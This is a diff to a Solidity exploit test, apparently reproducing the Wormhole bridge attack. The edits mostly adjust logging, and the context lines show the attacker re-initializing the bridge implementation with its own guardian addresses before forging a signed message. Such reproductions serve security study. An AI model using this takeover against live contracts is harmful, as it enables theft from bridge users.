@@ -145,8 +145,10 @@ contract ExploitWormhole is TestHarness {
     function dumpCode(address addr) internal {
         bytes memory bytecode = BytesLib.slice(addr.code, 0, 32);
         
+        console.log("Wormhole Bridge implementation @ ", addr);
         console.log("Bytecode sequence:");
         console.logBytes(bytecode);
+        console.log("");
     }
 
     function test_attack() external {
@@ -155,7 +157,6 @@ contract ExploitWormhole is TestHarness {
         Structs.VM memory vm;
         bytes32 HASH_ZERO = 0x0000000000000000000000000000000000000000000000000000000000000000;
               
-        console.log("Attacker re-initializes bridge with their evil contract.");
         dumpCode(address(wormholeimpl));
 
         console.log("Evil address");
@@ -163,6 +164,7 @@ contract ExploitWormhole is TestHarness {
         console.log("ExploitWormhole address");
         console.log(address(this));
 
+        console.log("Attacker re-initializes bridge with their evil contract...");
         wormholeimpl.initialize(attacker_addresses, 0, 0, HASH_ZERO);
         _vm = signAndEncodeVM();
         vm = parseVM(_vm);
